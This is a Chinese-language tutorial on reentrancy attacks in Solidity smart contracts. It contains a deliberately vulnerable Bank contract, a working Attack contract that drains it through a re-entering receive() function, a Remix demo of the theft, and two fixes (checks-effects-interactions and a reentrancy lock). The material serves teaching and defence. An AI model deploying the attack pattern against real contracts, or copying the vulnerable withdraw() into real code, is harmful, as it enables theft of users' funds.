# Solidity智能合约安全：重入攻击


{{&lt; admonition quote &#34;引言&#34; &gt;}}
- 它曾导致以太坊分叉为 ETH 和 ETC（以太经典）。
{{&lt; /admonition &gt;}}


# 1 什么是重入攻击？
重入攻击是智能合约中最常见的一种攻击，``攻击者通过合约漏洞（例如fallback函数）循环调用合约，将合约中资产转走或铸造大量代币``。

一些著名的重入攻击事件：
- 2016年，The DAO合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 ETH，并导致以太坊分叉为 ETH 链和 ETC（以太经典）链。
- 2019年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 sETH。
- 2020年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。
- 2021年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。
- 2022年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。

距离 The DAO 被重入攻击已经多年了，但每年还是会有几次因重入漏洞而损失千万美元的项目，因此理解这个漏洞非常重要。

{{&lt; admonition note &#34;抢银行的故事&#34; &gt;}}
为了让大家更好理解，这里给大家讲一个&#34;黑客5oneXj抢银行&#34;的故事。

以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：
1. 查询用户的 ETH 余额，如果大于0，进行下一步。
2. 将用户的 ETH 余额从银行转给用户，并询问用户是否收到。
3. 将用户名下的余额更新为0。

一天黑客 5oneXj 来到了银行，这是他和机器人柜员的对话：

- 5oneXj : 我要取钱，1 ETH。
- Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？
- 5oneXj : 等等，我要取钱，1 ETH。
- Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？
- 5oneXj : 等等，我要取钱，1 ETH。
- Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？
- 5oneXj : 等等，我要取钱，1 ETH。
- ...

最后，黑客5oneXj通过重入攻击的漏洞，把银行的资产搬空了，银行卒。

{{&lt; /admonition &gt;}}

# 2 漏洞合约复现
## 2.1 银行合约

银行合约非常简单，包含1个状态变量 `balanceOf` 记录所有用户的以太坊余额，以及包含3个函数：

- **deposit()：** 存款函数，将ETH存入银行合约，并更新用户的余额。
- **withdraw()：** 提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。``注意：这个函数有重入漏洞！``
- **getBalance()：** 获取银行合约里的ETH余额。

```solidity
contract Bank {
    mapping (address =&gt; uint256) public balanceOf; // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] &#43;= msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance &gt; 0, &#34;Insufficient balance&#34;);
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}(&#34;&#34;);
        require(success, &#34;Failed to send Ether&#34;);
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## 2.2 攻击合约

``重入攻击的一个攻击点就是合约转账ETH的地方：`` **转账ETH的目标地址如果是合约，会触发对方合约的fallback（回退）函数，从而造成循环调用的可能。**

```solidity
    (bool success, ) = msg.sender.call{value: balance}(&#34;&#34;);
```

假如黑客在攻击合约中的 ``fallback()`` 或 ``receive()`` 函数中重新调用了Bank合约的 ``withdraw()`` 函数，就会造成5oneXj抢银行故事中的循环调用，不断让Bank合约转账给攻击者，最终将合约的ETH提空。

```solidity
    receive() external payable {
        bank.withdraw();
    }
```
下面我们看下攻击合约，它的逻辑非常简单，就是通过 ``receive()`` 回退函数循环调用Bank合约的 ``withdraw()`` 函数。它有1个状态变量bank用于记录Bank合约地址，以及包含4个函数：

- **构造函数:** 初始化Bank合约地址。
- **receive():** 回调函数，在接收ETH时被触发，并再次调用Bank合约的 ``withdraw()`` 函数，循环提款。
- **attack()：** 攻击函数，先Bank合约的 ``deposit()`` 函数存款，然后调用``withdraw()``发起第一次提款，之后Bank合约的 ``withdraw()`` 函数和攻击合约的receive()函数会循环调用，将Bank合约的ETH提空。
- **getBalance()：** 获取攻击合约里的ETH余额。

```solidity
contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的 withdraw 函数
    receive() external payable {
        if (bank.getBalance() &gt;= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, &#34;Require 1 Ether to attack&#34;);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```
# 3 Remix演示

1. 部署`Bank`合约，调用`deposit()`函数，转入`20 ETH`。
2. 切换到攻击者钱包，部署`Attack`合约。
3. 调用`Atack`合约的`attack()`函数发动攻击，调用时需转账`1 ETH`。
4. 调用`Bank`合约的`getBalance()`函数，发现余额已被提空。
5. 调用`Attack`合约的`getBalance()`函数，可以看到余额变为`21 ETH`，重入攻击成功。

# 4 预防办法

目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。

## 4.1 检查-影响-交互模式

检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将`Bank`合约`withdraw()`函数中的更新余额提前到转账`ETH`之前，就可以修复漏洞：

```solidity 
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance &gt; 0, &#34;Insufficient balance&#34;);
    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}(&#34;&#34;);
    require(success, &#34;Failed to send Ether&#34;);
}
```

## 4.2 重入锁

重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为`0`的状态变量`_status`。被`nonReentrant`重入锁修饰的函数，在第一次调用时会检查`_status`是否为`0`，紧接着将`_status`的值改为`1`，调用结束后才会再改为`0`。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读[WTF Solidity极简教程第11讲：修饰器](https://github.com/AmazingAng/WTFSolidity/blob/main/13_Modifier/readme.md)。

```solidity
uint256 private _status; // 重入锁

// 重入锁
modifier nonReentrant() {
    // 在第一次调用 nonReentrant 时，_status 将是 0
    require(_status == 0, &#34;ReentrancyGuard: reentrant call&#34;);
    // 在此之后对 nonReentrant 的任何调用都将失败
    _status = 1;
    _;
    // 调用结束，将 _status 恢复为0
    _status = 0;
}
```

只需要用`nonReentrant`重入锁修饰`withdraw()`函数，就可以预防重入攻击了。

```solidity
// 用重入锁保护有漏洞的函数
function withdraw() external nonReentrant{
    uint256 balance = balanceOf[msg.sender];
    require(balance &gt; 0, &#34;Insufficient balance&#34;);

    (bool success, ) = msg.sender.call{value: balance}(&#34;&#34;);
    require(success, &#34;Failed to send Ether&#34;);

    balanceOf[msg.sender] = 0;
}
```

# 5 总结

这一讲，我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个`5oneXj`抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行`ETH`转账时进行重入攻击。实际业务中，`ERC721`和`ERC1155`的`safeTransfer()`和`safeTransferFrom()`安全转账函数，还有`ERC777`的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的`external`函数，虽然可能会消耗更多的`gas`，但是可以预防更大的损失。


